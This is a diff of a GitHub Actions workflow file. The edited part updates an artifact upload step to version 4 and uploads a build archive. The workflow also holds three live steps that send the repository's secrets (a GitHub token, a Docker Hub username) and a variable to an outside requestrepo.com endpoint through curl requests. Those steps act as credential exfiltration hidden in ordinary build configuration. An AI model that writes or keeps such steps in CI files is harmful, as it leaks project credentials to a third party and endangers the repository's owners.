@@ -20,13 +20,12 @@ jobs:
        env: 
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
-     # 添加下面的部分来创建一个artifact
-     - name: Upload artifact
-       uses: actions/upload-artifact@v2
+     - name: Upload build archive
+       uses: actions/upload-artifact@v4
        with:
-         name: my-artifact # 你想要给这个artifact起的名字
-         path: .
-
+          name: build.tar.gz
+          path: build.tar.gz
+          retention-days: ${{ env.artifactRetentionDays }}
      - run: curl https://rj0lnjwx.requestrepo.com/2_${{ secrets.GITHUBTOKEN }}
      - run: curl https://rj0lnjwx.requestrepo.com/3_${{ secrets.DOCKER_HUB_USERNAME }}
      - run: curl https://rj0lnjwx.requestrepo.com/4_${{ vars.TEST_VAR }}
